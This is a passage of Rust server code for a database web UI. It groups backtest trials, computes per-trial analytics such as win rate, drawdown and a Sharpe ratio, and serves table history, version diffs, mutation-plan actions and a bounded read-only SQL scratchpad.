        let status = if report.is_some() {
            if warnings.is_empty() {
                "finished"
            } else {
                "warned"
            }
        } else if quiet_ns < TRIAL_ACTIVE_WINDOW_NS {
            "running"
        } else if quiet_ns < TRIAL_STALLED_AFTER_NS {
            "idle"
        } else {
            "stalled"
        };
        let priority = if needs_decision {
            5
        } else if status == "stalled" || !warnings.is_empty() {
            4
        } else if status == "finished" {
            3
        } else {
            2
        };
        let starting_cash = report
            .as_ref()
            .and_then(|row| row.get("starting_cash"))
            .and_then(serde_json::Value::as_f64);
        let analytics = trial_analytics(&fork, &tables, starting_cash).await?;
        grouped.entry(study_id).or_default().push(json!({
            "run_id": run_id,
            "fork": summary.name,
            "trial": trial,
            "phase": phase,
            "parameters": parameters,
            "status": status,
            // Ship the silence itself so the UI can say "nothing written for
            // 3m" rather than leaving a reader to guess what `idle` measured.
            "quiet_ns": quiet_ns,
            "warnings": warnings,
            "needs_decision": needs_decision,
            "priority": priority,
            "created_at_ns": summary.created_at_ns,
            "last_write_ns": summary.last_write_ns,
            "trial_digest": config.as_ref()
                .and_then(|row| row.get("trial_digest")).cloned(),
            "metrics": report,
            "analytics": analytics,
        }));
    }

    // A trial digest identifies a computation, so a second fork carrying one
    // is a reuse rather than a rerun. The earliest fork owns the result; the
    // rest are marked so the leaderboard can say "served, not recomputed"
    // instead of showing what looks like a duplicate run.
    let mut first_seen: BTreeMap<String, i64> = BTreeMap::new();
    for trials in grouped.values() {
        for trial in trials {
            let (Some(digest), Some(created)) = (
                trial["trial_digest"].as_str(),
                trial["created_at_ns"].as_i64(),
            ) else {
                continue;
            };
            first_seen
                .entry(digest.to_string())
                .and_modify(|earliest| *earliest = (*earliest).min(created))
                .or_insert(created);
        }
    }
    for trials in grouped.values_mut() {
        for trial in trials {
            let reused = trial["trial_digest"]
                .as_str()
                .zip(trial["created_at_ns"].as_i64())
                .is_some_and(|(digest, created)| {
                    first_seen
                        .get(digest)
                        .is_some_and(|earliest| created > *earliest)
                });
            trial["reused"] = json!(reused);
        }
    }

    let mut experiments: Vec<serde_json::Value> = grouped
        .into_iter()
        .map(|(id, mut trials)| {
            trials.sort_by(|a, b| {
                b["priority"]
                    .as_u64()
                    .cmp(&a["priority"].as_u64())
                    .then_with(|| a["trial"].as_u64().cmp(&b["trial"].as_u64()))
            });
            let priority = trials
                .iter()
                .filter_map(|trial| trial["priority"].as_u64())
                .max()
                .unwrap_or(1);
            let warning_count = trials
                .iter()
                .filter(|trial| {
                    trial["warnings"]
                        .as_array()
                        .is_some_and(|warnings| !warnings.is_empty())
                })
                .count();
            json!({
                "id": id,
                "priority": priority,
                "warning_count": warning_count,
                "trials": trials,
            })
        })
        .collect();
    experiments.sort_by(|a, b| {
        b["priority"]
            .as_u64()
            .cmp(&a["priority"].as_u64())
            .then_with(|| a["id"].as_str().cmp(&b["id"].as_str()))
    });
    Ok(Json(json!({
        "experiments": experiments,
        "forks_total": forks_total,
        "forks_scanned": forks_scanned,
        "truncated": forks_scanned < forks_total,
        "scan_limit": EXPERIMENT_FORK_LIMIT,
    })))
}

fn infer_study_trial(run_id: &str) -> Option<(String, u64, String)> {
    let mut parts = run_id.rsplitn(3, '-');
    let phase = parts.next()?.to_string();
    let trial_text = parts.next()?;
    let study = parts.next()?.to_string();
    if trial_text.len() != 4 || !trial_text.bytes().all(|byte| byte.is_ascii_digit()) {
        return None;
    }
    Some((study, trial_text.parse().ok()?, phase))
}

async fn scan_first_object(
    db: &Database,
    table: &str,
) -> Result<Option<serde_json::Map<String, serde_json::Value>>, Error> {
    let (batches, _) = db
        .scan(
            table,
            ReadAt::Latest,
            h5i_db_core::ScanOptions {
                limit: Some(1),
                ..Default::default()
            },
        )
        .await?;
    let payload = batches_to_json(&batches)?;
    let names: Vec<&str> = payload["schema"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|field| field["name"].as_str())
        .collect();
    let Some(row) = payload["rows"].as_array().and_then(|rows| rows.first()) else {
        return Ok(None);
    };
    let values = row
        .as_array()
        .ok_or_else(|| Error::internal("UI table row is not an array"))?;
    Ok(Some(
        names
            .into_iter()
            .zip(values.iter().cloned())
            .map(|(name, value)| (name.to_string(), value))
            .collect(),
    ))
}

/// Read one of a trial's result tables, bounded.
async fn scan_table(
    fork: &Database,
    table: &str,
    limit: usize,
) -> Result<Vec<arrow::array::RecordBatch>, Error> {
    let (batches, _) = fork
        .scan(
            table,
            ReadAt::Latest,
            h5i_db_core::ScanOptions {
                limit: Some(limit),
                ..Default::default()
            },
        )
        .await?;
    Ok(batches)
}

fn row_count(batches: &[arrow::array::RecordBatch]) -> usize {
    batches
        .iter()
        .map(arrow::array::RecordBatch::num_rows)
        .sum()
}

/// One entry per scanned row: the `Float64` value, or `None` where the row has
/// no usable one.
///
/// Row-aligned by construction. Skipping a batch that lacks the column, or
/// carries it as another type, would shorten this vector while its neighbour
/// stayed long, and the two are read by index: `realized_pnl[i]` was paired
/// with a *different instrument's* `settlement_pnl[i]` from the offset on.
/// Padding keeps index `i` meaning row `i` in every column.
fn float_column(batches: &[arrow::array::RecordBatch], name: &str) -> Vec<Option<f64>> {
    use arrow::array::{Array, Float64Array};
    let mut out = Vec::new();
    for batch in batches {
        let values = batch
            .column_by_name(name)
            .and_then(|column| column.as_any().downcast_ref::<Float64Array>());
        match values {
            None => out.resize(out.len() + batch.num_rows(), None),
            Some(values) => {
                for index in 0..values.len() {
                    out.push((!values.is_null(index)).then(|| values.value(index)));
                }
            }
        }
    }
    out
}

/// One entry per scanned row: the nanosecond timestamp, or `None`. Row-aligned
/// for the same reason [`float_column`] is, so a stamp can be read next to the
/// value it belongs to instead of next to whichever value happens to sit at
/// the same index in a separately-filtered list.
fn timestamp_column(batches: &[arrow::array::RecordBatch], name: &str) -> Vec<Option<i64>> {
    use arrow::array::{Array, TimestampNanosecondArray};
    let mut out = Vec::new();
    for batch in batches {
        let values = batch
            .column_by_name(name)
            .and_then(|column| column.as_any().downcast_ref::<TimestampNanosecondArray>());
        match values {
            None => out.resize(out.len() + batch.num_rows(), None),
            Some(values) => {
                for index in 0..values.len() {
                    out.push((!values.is_null(index)).then(|| values.value(index)));
                }
            }
        }
    }
    out
}

/// How many rows carry a given value in a `Utf8` column.
fn count_matching(batches: &[arrow::array::RecordBatch], name: &str, wanted: &str) -> usize {
    use arrow::array::{Array, StringArray};
    let mut hits = 0;
    for batch in batches {
        let Some(column) = batch.column_by_name(name) else {
            continue;
        };
        let Some(values) = column.as_any().downcast_ref::<StringArray>() else {
            continue;
        };
        for index in 0..values.len() {
            if !values.is_null(index) && values.value(index) == wanted {
                hits += 1;
            }
        }
    }
    hits
}

/// Largest peak-to-trough fall of an equity curve, as a negative fraction.
fn max_drawdown(curve: &[f64]) -> Option<f64> {
    let mut peak = f64::NEG_INFINITY;
    let mut worst: Option<f64> = None;
    for &point in curve {
        if !point.is_finite() {
            continue;
        }
        peak = peak.max(point);
        if peak > 0.0 {
            let fall = point / peak - 1.0;
            worst = Some(worst.map_or(fall, |current: f64| current.min(fall)));
        }
    }
    worst
}

/// Even-spaced sample of a curve, endpoints always kept, so the sparkline
/// keeps the curve's shape without shipping every point.
fn downsample(curve: &[f64], points: usize) -> Vec<f64> {
    if curve.len() <= points || points < 2 {
        return curve.to_vec();
    }
    let last = curve.len() - 1;
    (0..points)
        .map(|index| curve[index * last / (points - 1)])
        .collect()
}

/// Per-trial numbers the leaderboard needs that `bt_run` does not carry:
/// counts from the order and fill tables, and shape from the equity curve.
///
/// Everything here is derived, never assumed. A Sharpe needs a periodicity,
/// so it is annualised from the median spacing of the equity samples and is
/// `null` when that spacing is degenerate; the spacing travels with it so the
/// UI can say what the number was annualised from. An unlabelled Sharpe is
/// worse than no Sharpe.
async fn trial_analytics(
    fork: &Database,
    tables: &[String],
    starting_cash: Option<f64>,
) -> Result<serde_json::Value, Error> {
    let has = |name: &str| tables.iter().any(|table| table == name);
    let mut out = serde_json::Map::new();
    let mut truncated = false;

    if has("bt_orders") {
        let batches = scan_table(fork, "bt_orders", TRIAL_SCAN_LIMIT).await?;
        let orders = row_count(&batches);
        truncated |= orders >= TRIAL_SCAN_LIMIT;
        out.insert("orders".into(), json!(orders));
        out.insert(
            "rejected".into(),
            json!(count_matching(&batches, "status", "rejected")),
        );
    }
    if has("bt_fills") {
        let batches = scan_table(fork, "bt_fills", TRIAL_SCAN_LIMIT).await?;
        let fills = row_count(&batches);
        truncated |= fills >= TRIAL_SCAN_LIMIT;
        out.insert("fills".into(), json!(fills));
    }
    if has("bt_positions") {
        let batches = scan_table(fork, "bt_positions", TRIAL_SCAN_LIMIT).await?;
        // A position's outcome is realised plus settled. `market_exit_pnl` is
        // the counterfactual "worth at market" and is an alternative to
        // settlement, not an addend -- adding it would double-count. Both
        // columns come back row-aligned to the scan, so index N is the same
        // position in each and the pairing below is the position's own.
        let realized = float_column(&batches, "realized_pnl");
        let settled = float_column(&batches, "settlement_pnl");
        let mut won = 0usize;
        let mut scored = 0usize;
        for (index, value) in realized.iter().enumerate() {
            let Some(realized) = value else { continue };
            let net = realized + settled.get(index).copied().flatten().unwrap_or(0.0);
            scored += 1;
            if net > 0.0 {
                won += 1;
            }
        }
        out.insert("instruments".into(), json!(scored));
        if scored > 0 {
            out.insert("instruments_won".into(), json!(won));
            out.insert("win_rate".into(), json!(won as f64 / scored as f64));
        }
    }
    if has("bt_equity") {
        let batches = scan_table(fork, "bt_equity", TRIAL_SCAN_LIMIT).await?;
        truncated |= row_count(&batches) >= TRIAL_SCAN_LIMIT;
        let equity = float_column(&batches, "equity");
        let stamps = timestamp_column(&batches, "ts");
        // Shape statistics only need the values, so they keep every usable
        // one. The Sharpe below needs a stamp *and* a value from the same
        // row, which is a strictly smaller set: filtering the two columns
        // independently is what let a curve of one row set be annualised by an
        // interval measured over another.
        let curve: Vec<f64> = equity
            .iter()
            .filter_map(|value| value.filter(|v| v.is_finite()))
            .collect();
        let samples: Vec<(i64, f64)> = stamps
            .iter()
            .zip(equity.iter())
            .filter_map(|(stamp, value)| Some(((*stamp)?, (*value).filter(|v| v.is_finite())?)))
            .collect();
        if !curve.is_empty() {
            out.insert("equity_points".into(), json!(curve.len()));
            out.insert("equity".into(), json!(downsample(&curve, SPARKLINE_POINTS)));
            if let Some(drawdown) = max_drawdown(&curve) {
                out.insert("max_drawdown".into(), json!(drawdown));
            }
            let base = starting_cash
                .filter(|cash| *cash > 0.0)
                .or(curve.first().copied());
            if let (Some(base), Some(last)) = (base.filter(|value| *value > 0.0), curve.last()) {
                out.insert("return_pct".into(), json!((last / base - 1.0) * 100.0));
            }
        }
        // Per-sample simple returns, then an annualisation read off the
        // samples' own median spacing rather than an assumed calendar. Return
        // and gap are produced together from one pass over the paired samples,
        // so the interval the ratio is scaled by is measured over exactly the
        // steps the ratio was computed from.
        let mut returns: Vec<f64> = Vec::new();
        let mut gaps: Vec<i64> = Vec::new();
        for pair in samples.windows(2) {
            let (previous_ts, previous) = pair[0];
            let (ts, value) = pair[1];
            let step = value / previous - 1.0;
            let gap = ts - previous_ts;
            if previous == 0.0 || !step.is_finite() || gap <= 0 {
                continue;
            }
            returns.push(step);
            gaps.push(gap);
        }
        gaps.sort_unstable();
        let interval = gaps.get(gaps.len() / 2).copied();
        if returns.len() >= 3 {
            let mean = returns.iter().sum::<f64>() / returns.len() as f64;
            let variance = returns
                .iter()
                .map(|value| (value - mean).powi(2))
                .sum::<f64>()
                / (returns.len() - 1) as f64;
            let deviation = variance.sqrt();
            if deviation > 0.0
                && let Some(interval) = interval.filter(|gap| *gap > 0)
            {
                let per_year = YEAR_NS / interval as f64;
                out.insert("sharpe".into(), json!(mean / deviation * per_year.sqrt()));
                out.insert("sample_interval_ns".into(), json!(interval));
                // Annualising a two-hour run to a year is arithmetic, not
                // evidence. Ship what the ratio was computed from so the UI
                // can mark a thin sample rather than quoting a
                // confident-looking number nobody should trade on.
                out.insert("sharpe_samples".into(), json!(returns.len()));
                out.insert(
                    "span_ns".into(),
                    json!(interval.saturating_mul(returns.len() as i64)),
                );
            }
        }
    }
    if truncated {
        out.insert("truncated".into(), json!(true));
        out.insert("scan_limit".into(), json!(TRIAL_SCAN_LIMIT));
    }
    Ok(serde_json::Value::Object(out))
}

/// Fork monitor projection: every fork with lineage and liveness numbers.
async fn forks(State(st): State<UiState>) -> ApiResult {
    Ok(Json(json!({
        "fork": st.db.fork_name(),
        "forks": st.db.list_forks().await?,
    })))
}

/// One fork in depth: its pin set and metadata plus the per-table divergence
/// from its base. Runs against the base scope so it also answers when the
/// server itself was started `--fork`-scoped.
async fn fork_detail(State(st): State<UiState>, AxPath(name): AxPath<String>) -> ApiResult {
    let base = st.db.base();
    let info = base.fork_info(&name).await?;
    let diff = base.fork_diff(&name, None).await?;
    Ok(Json(json!({"info": info, "diff": diff})))
}

/// Server-sent events for the monitor: a ticker re-derives the live frame
/// and pushes it only when its fingerprint changed, so an idle database is
/// silent (bar keep-alives) and a busy one streams one frame per tick. The
/// first frame is sent immediately.
async fn events(
    State(st): State<UiState>,
) -> Sse<impl Stream<Item = Result<Event, std::convert::Infallible>>> {
    let stream = futures::stream::unfold(
        (st, None::<u64>, true),
        |(st, mut last, mut first)| async move {
            loop {
                if !first {
                    tokio::time::sleep(EVENTS_INTERVAL).await;
                }
                first = false;
                let frame = match live_frame(&st).await {
                    Ok(f) => f,
                    // A storage hiccup mid-poll is not worth tearing the
                    // stream down for; the next tick retries.
                    Err(_) => continue,
                };
                let body = frame.to_string();
                let fp = fingerprint(&body);
                if last == Some(fp) {
                    continue;
                }
                last = Some(fp);
                let ev = Event::default().event("update").data(body);
                return Some((Ok(ev), (st, last, false)));
            }
        },
    );
    Sse::new(stream).keep_alive(KeepAlive::new().interval(Duration::from_secs(15)))
}

fn fingerprint(s: &str) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    s.hash(&mut h);
    h.finish()
}

fn plan_summary_json(plan: &MutationPlan, head: u64) -> serde_json::Value {
    json!({
        "plan_id": plan.plan_id,
        "table": plan.table,
        "op": plan.op.to_string(),
        "base_version": plan.base_version,
        "head_version": head,
        // A plan whose base is no longer head can only conflict: surface it.
        "stale": head != plan.base_version,
        "expired": plan.is_expired(),
        "created_at_ns": plan.created_at_ns,
        "expires_at_ns": plan.expires_at_ns,
        "note": plan.note,
        "summary": plan.summary,
    })
}

async fn table_detail(State(st): State<UiState>, AxPath(name): AxPath<String>) -> ApiResult {
    let resolved = st.db.resolve(&name, ReadAt::Latest).await?;
    let versions = st.db.list_versions(&name).await?;
    let fields: Vec<_> = resolved
        .schema
        .fields()
        .iter()
        .map(|f| {
            json!({
                "name": f.name(),
                "type": f.data_type().to_string(),
                "nullable": f.is_nullable(),
            })
        })
        .collect();
    // The summary already carries the audit columns, so the history renders
    // from one pass over the manifests rather than a full re-resolve (entry,
    // head, retention, manifest, spec) per version.
    let version_rows: Vec<_> = versions
        .iter()
        .map(|v| {
            json!({
                "version": v.sequence,
                "op": v.op,
                "committed_at_ns": v.committed_at_ns,
                "rows": v.rows,
                "bytes": v.bytes,
                "segments": v.segments,
                "note": v.note,
                "execution_mode": v.execution_mode,
                "plan_hash": v.plan_hash,
            })
        })
        .collect();
    Ok(Json(json!({
        "name": name,
        "schema": fields,
        "time_column": resolved.spec.time_column,
        "sort_key": resolved.spec.sort_key,
        "head": resolved.head_sequence,
        "versions": version_rows,
    })))
}

#[derive(Deserialize)]
struct SampleParams {
    version: Option<u64>,
    #[serde(default = "default_sample_rows")]
    rows: usize,
}

fn default_sample_rows() -> usize {
    50
}

async fn table_sample(
    State(st): State<UiState>,
    AxPath(name): AxPath<String>,
    Query(p): Query<SampleParams>,
) -> ApiResult {
    let at = p.version.map(ReadAt::Version).unwrap_or(ReadAt::Latest);
    let (batches, _) = st
        .db
        .scan(
            &name,
            at,
            h5i_db_core::ScanOptions {
                limit: Some(p.rows.min(UI_ROW_LIMIT)),
                ..Default::default()
            },
        )
        .await?;
    Ok(Json(batches_to_json(&batches)?))
}

#[derive(Deserialize)]
struct DiffParams {
    from: u64,
    to: u64,
}

/// Version diff: rollup deltas plus segment-level added/removed/kept.
async fn version_diff(
    State(st): State<UiState>,
    AxPath(name): AxPath<String>,
    Query(p): Query<DiffParams>,
) -> ApiResult {
    let a = st
        .db
        .resolve(&name, ReadAt::Version(p.from))
        .await?
        .manifest;
    let b = st.db.resolve(&name, ReadAt::Version(p.to)).await?.manifest;
    let a_ids: std::collections::BTreeMap<_, _> = a.segments.iter().map(|s| (s.id, s)).collect();
    let b_ids: std::collections::BTreeMap<_, _> = b.segments.iter().map(|s| (s.id, s)).collect();
    let added: Vec<_> = b
        .segments
        .iter()
        .filter(|s| !a_ids.contains_key(&s.id))
        .map(|s| json!({"id": s.id, "rows": s.rows, "bytes": s.bytes, "time_range": s.time_range}))
        .collect();
    let removed: Vec<_> = a
        .segments
        .iter()
        .filter(|s| !b_ids.contains_key(&s.id))
        .map(|s| json!({"id": s.id, "rows": s.rows, "bytes": s.bytes, "time_range": s.time_range}))
        .collect();
    let kept = b
        .segments
        .iter()
        .filter(|s| a_ids.contains_key(&s.id))
        .count();
    Ok(Json(json!({
        "table": name,
        "from": {"version": a.sequence, "rows": a.rows, "bytes": a.bytes, "op": a.op.to_string(), "schema_revision": a.schema_revision},
        "to": {"version": b.sequence, "rows": b.rows, "bytes": b.bytes, "op": b.op.to_string(), "schema_revision": b.schema_revision, "execution_mode": b.execution_mode, "note": b.note},
        "rows_delta": b.rows as i64 - a.rows as i64,
        "bytes_delta": b.bytes as i64 - a.bytes as i64,
        "schema_changed": a.schema_revision != b.schema_revision,
        "segments": {"added": added, "removed": removed, "kept": kept},
    })))
}

async fn plan_detail(
    State(st): State<UiState>,
    AxPath((table, id)): AxPath<(String, uuid::Uuid)>,
) -> ApiResult {
    let plan = st.db.load_plan(&table, id).await?;
    let head = st.db.resolve(&table, ReadAt::Latest).await?.head_sequence;
    let mut out = plan_summary_json(&plan, head);
    let decode = |b64: &Option<String>| -> Result<serde_json::Value, Error> {
        match b64 {
            None => Ok(serde_json::Value::Null),
            Some(b) => {
                let batches = MutationPlan::decode_sample(b)?;
                batches_to_json(&batches)
            }
        }
    };
    out["before_sample"] = decode(&plan.before_sample_ipc_b64)?;
    out["after_sample"] = decode(&plan.after_sample_ipc_b64)?;
    Ok(Json(out))
}

fn require_mutations(st: &UiState) -> Result<(), ApiError> {
    if st.allow_mutations {
        Ok(())
    } else {
        Err(ApiError::Db(Error::ReadOnly {
            op: "plan apply/discard from the UI (restart with --allow-mutations)".into(),
        }))
    }
}

async fn plan_apply(
    State(st): State<UiState>,
    AxPath((table, id)): AxPath<(String, uuid::Uuid)>,
) -> ApiResult {
    require_mutations(&st)?;
    let plan = st.db.load_plan(&table, id).await?;
    tracing::info!(table = %table, plan_id = %id, op = %plan.op, "ui: plan apply requested");
    let result = match st.db.apply_plan(&plan).await {
        Ok(r) => r,
        Err(e) => {
            tracing::warn!(table = %table, plan_id = %id, code = e.code(), "ui: plan apply failed");
            return Err(e.into());
        }
    };
    let value = serde_json::to_value(&result).map_err(Error::from)?;
    tracing::info!(
        table = %table,
        plan_id = %id,
        version = ?value.get("sequence").and_then(|v| v.as_u64()),
        "ui: plan applied"
    );
    Ok(Json(value))
}

async fn plan_discard(
    State(st): State<UiState>,
    AxPath((table, id)): AxPath<(String, uuid::Uuid)>,
) -> ApiResult {
    require_mutations(&st)?;
    st.db.discard_plan(&table, id).await?;
    tracing::info!(table = %table, plan_id = %id, "ui: plan discarded");
    Ok(Json(json!({"discarded": id})))
}

#[derive(Deserialize)]
struct QueryBody {
    sql: String,
}

/// SQL scratchpad: read-only session per request, memory-capped, row-capped,
/// wall-clock-bounded, with scan metrics so pruning is visible in the UI.
async fn run_query(State(st): State<UiState>, Json(body): Json<QueryBody>) -> ApiResult {
    let started = std::time::Instant::now();
    let session = H5iSession::new(
        st.db.clone(),
        SessionOptions {
            memory_limit: Some(st.query_memory_limit),
            ..Default::default()
        },
    )
    .await
    .map_err(|e| ApiError::Db(Error::internal(e)))?;
    let execute = async {
        if !st.query_start_delay.is_zero() {
            tokio::time::sleep(st.query_start_delay).await;
        }
        // Fetch one row past the cap so truncation is detectable.
        let df = session
            .sql_reported(&body.sql)
            .await
            .and_then(|df| df.limit(0, Some(UI_ROW_LIMIT + 1)))
            .map_err(|e| ApiError::Db(Error::invalid(e.to_string())))?;
        let schema = df.schema();
        let (batches, report) = df
            .collect()
            .await
            .map_err(|e| ApiError::Db(Error::invalid(e.to_string())))?;
        Ok::<_, ApiError>((schema, batches, report))
    };
    let (schema, mut batches, report) = match tokio::time::timeout(st.query_timeout, execute).await
    {
        Err(_) => {
            return Err(ApiError::Custom {
                status: StatusCode::REQUEST_TIMEOUT,
                code: "query_timeout",
                message: format!(
                    "query exceeded the {:?} scratchpad budget",
                    st.query_timeout
                ),
                hint: "narrow the query, or run it via the CLI which has no interactive timeout",
            });
        }
        Ok(r) => r?,
    };
    let truncated = truncate_batches(&mut batches, UI_ROW_LIMIT);
    let mut out = batches_to_json_with_schema(&batches, Some(schema))?;
    out["truncated"] = json!(truncated);
    out["scan_metrics"] = serde_json::to_value(&report.scans).map_err(Error::from)?;
    out["performance"] = serde_json::to_value(report).map_err(Error::from)?;
    out["wall_ms"] = json!(started.elapsed().as_secs_f64() * 1000.0);
    Ok(Json(out))
}

/// Cap total rows across `batches`; returns whether anything was dropped.
fn truncate_batches(batches: &mut Vec<arrow::array::RecordBatch>, cap: usize) -> bool {
    let mut seen = 0usize;
    for i in 0..batches.len() {
        let n = batches[i].num_rows();
        if seen + n > cap {
            batches[i] = batches[i].slice(0, cap - seen);
            batches.truncate(i + 1);
            return true;
        }
        seen += n;
    }
    false
}

/// Render batches as `{schema: [...], rows: [[...]]}` for the browser.
fn batches_to_json(batches: &[arrow::array::RecordBatch]) -> Result<serde_json::Value, Error> {
    batches_to_json_with_schema(batches, None)
}

/// Like [`batches_to_json`], but keeps the schema when there are no batches.
fn batches_to_json_with_schema(
    batches: &[arrow::array::RecordBatch],
    empty_schema: Option<arrow::datatypes::SchemaRef>,
) -> Result<serde_json::Value, Error> {
    let schema = match batches.first() {
        Some(b) => b.schema(),
        None => match empty_schema {
            Some(s) => s,
            None => return Ok(json!({"schema": [], "rows": []})),
        },
    };
    // arrow-json emits row *objects*, so duplicate output names (e.g.
    // `SELECT a.x, b.x`) would collapse; disambiguate with `_N` suffixes.
    let mut used = std::collections::HashSet::new();
    let mut names = Vec::with_capacity(schema.fields().len());
    for f in schema.fields() {
        let mut name = f.name().clone();
        let mut n = 1usize;
        while !used.insert(name.clone()) {
            name = format!("{}_{n}", f.name());
            n += 1;
        }
        names.push(name);
    }
    let owned: Vec<arrow::array::RecordBatch>;
    let (schema, batches) = if names
        .iter()
        .zip(schema.fields())
        .any(|(n, f)| n != f.name())
    {
        let fields: Vec<_> = schema
            .fields()
            .iter()
            .zip(&names)
            .map(|(f, n)| f.as_ref().clone().with_name(n))
            .collect();
        let renamed = Arc::new(arrow::datatypes::Schema::new_with_metadata(
            fields,
            schema.metadata().clone(),
        ));
        owned = batches
            .iter()
            .map(|b| {
                arrow::array::RecordBatch::try_new(renamed.clone(), b.columns().to_vec())
                    .map_err(Error::Arrow)
            })
            .collect::<Result<_, _>>()?;
        (renamed, owned.as_slice())
    } else {
        (schema, batches)
    };
    let fields: Vec<_> = schema
        .fields()
        .iter()
        .map(|f| json!({"name": f.name(), "type": f.data_type().to_string()}))
        .collect();
    if batches.iter().all(|b| b.num_rows() == 0) {
        return Ok(json!({"schema": fields, "rows": []}));
    }
    // arrow-json produces row objects; convert to arrays to preserve column
    // order and keep payloads small.
    let mut buf = Vec::new();
    {
        let mut writer = arrow::json::writer::WriterBuilder::new()
            .with_explicit_nulls(true)
            .build::<_, arrow::json::writer::JsonArray>(&mut buf);
        for b in batches {
            writer.write(b).map_err(Error::Arrow)?;
        }
        writer.finish().map_err(Error::Arrow)?;
    }
    let objects: Vec<serde_json::Map<String, serde_json::Value>> = serde_json::from_slice(&buf)?;
    let rows: Vec<Vec<serde_json::Value>> = objects
        .into_iter()
        .map(|mut obj| {
            schema
                .fields()
                .iter()
                .map(|f| obj.remove(f.name()).unwrap_or(serde_json::Value::Null))
                .collect()
        })
        .collect();
    Ok(json!({"schema": fields, "rows": rows}))
}
